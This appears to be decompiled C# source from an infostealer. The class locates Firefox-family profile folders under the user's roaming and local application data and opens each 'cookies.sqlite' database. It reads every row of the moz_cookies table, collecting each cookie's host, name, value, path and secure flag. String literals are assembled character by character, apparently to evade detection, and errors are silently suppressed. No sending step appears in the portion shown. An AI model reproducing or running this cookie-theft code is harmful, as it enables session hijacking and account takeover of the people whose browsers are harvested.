using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

// Token: 0x02000004 RID: 4
public static class Entity20
{
	// Token: 0x0600000D RID: 13 RVA: 0x000032D4 File Offset: 0x000016D4
	public static List<Entity9> Id1(IList<string> paths)
	{
		List<Entity9> list = new List<Entity9>();
		try
		{
			foreach (string baseDirectory in from x in paths
			select Environment.ExpandEnvironmentVariables(x))
			{
				try
				{
					foreach (string text in FileCopier.FindPaths(baseDirectory, 2, 1, new string[]
					{
						"cookies.sqlite"
					}))
					{
						string fullName = new FileInfo(text).Directory.FullName;
						string text2 = text.Contains(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) ? Entity20.Id3(fullName) : Entity20.Id4(fullName);
						bool flag = string.IsNullOrEmpty(text2);
						if (!flag)
						{
							Entity9 entity = new Entity9
							{
								Id1 = text2,
								Id2 = new DirectoryInfo(fullName).Name,
								Id6 = new List<Entity10>(Entity20.Id2(fullName)),
								Id3 = new List<Entity12>(),
								Id4 = new List<Entity8>(),
								Id5 = new List<Entity11>()
							};
							bool flag2 = !entity.Id7();
							if (flag2)
							{
								list.Add(entity);
							}
						}
					}
				}
				catch
				{
				}
			}
		}
		catch (Exception ex)
		{
		}
		return list;
	}

	// Token: 0x0600000E RID: 14 RVA: 0x000034BC File Offset: 0x000018BC
	private static List<Entity10> Id2(string profile)
	{
		List<Entity10> list = new List<Entity10>();
		try
		{
			string text = Path.Combine(profile, new string(new char[]
			{
				'c',
				'o',
				'o',
				'k',
				'i',
				'e',
				's',
				'.',
				's',
				'q',
				'l',
				'i',
				't',
				'e'
			}));
			bool flag = !File.Exists(text);
			if (flag)
			{
				return list;
			}
			EntityReaderSql entityReaderSql = new EntityReaderSql(text);
			entityReaderSql.ReadContextTable(new string(new char[]
			{
				'm',
				'o',
				'z',
				'_',
				'c',
				'o',
				'o',
				'k',
				'i',
				'e',
				's'
			}));
			for (int i = 0; i < entityReaderSql.RowLength; i++)
			{
				Entity10 entity = null;
				try
				{
					entity = new Entity10(entityReaderSql.ReadContextValue(i, 6).Trim())
					{
						Id1 = entityReaderSql.ReadContextValue(i, 4).Trim(),
						Id2 = (entityReaderSql.ReadContextValue(i, 4).Trim()[0] == '.'),
						Id3 = entityReaderSql.ReadContextValue(i, 5).Trim(),
						Id4 = (entityReaderSql.ReadContextValue(i, 9)[0] == '1'),
						Id6 = entityReaderSql.ReadContextValue(i, 2).Trim(),
						Id7 = entityReaderSql.ReadContextValue(i, 3)
					};
				}
				catch
				{
				}
				bool flag2 = entity != null;
				if (flag2)
				{
					list.Add(entity);
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x0600000F RID: 15 RVA: 0x00003650 File Offset: 0x00001A50
	public static string Id3(string profilesDirectory)
	{
		string result = string.Empty;
		try
		{
			profilesDirectory = profilesDirectory.Replace(Environment.ExpandEnvironmentVariables(new string(new char[]
			{
				'%',
				'a',
				'p',
				'p',
				'd',
				'a',
				't',
				'a',
				'%',
				'\\'
			})), string.Empty);
			string[] array = profilesDirectory.Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			bool flag = array[2] == new string(new char[]
			{
				'P',
				'r',
				'o',
				'f',
				'i',
				'l',
				'e',
				's'
			});
			if (flag)
			{
				result = array[1];
			}
			else
			{
				result = array[0];
			}
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x06000010 RID: 16 RVA: 0x000036EC File Offset: 0x00001AEC
	public static string Id4(string profilesDirectory)
	{
		string result = string.Empty;
		try
		{
			profilesDirectory = profilesDirectory.Replace(Environment.ExpandEnvironmentVariables(new string(new char[]
			{
				'%',
				'l',
				'o',
				'c',
				'a',
				'l',
				'a',
				'p',
				'p',
				'd',
				'a',
				't',
				'a',
				'%',
				'\\'
			})), string.Empty);
			string[] array = profilesDirectory.Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			bool flag = array[2] == new string(new char[]
			{
				'P',
				'r',
				'o',
				'f',
				'i',
				'l',
				'e',
				's'
			});
			if (flag)
			{
				result = array[1];
			}
			else
			{
				result = array[0];
			}
		}
		catch
		{
		}
		return result;
	}
}
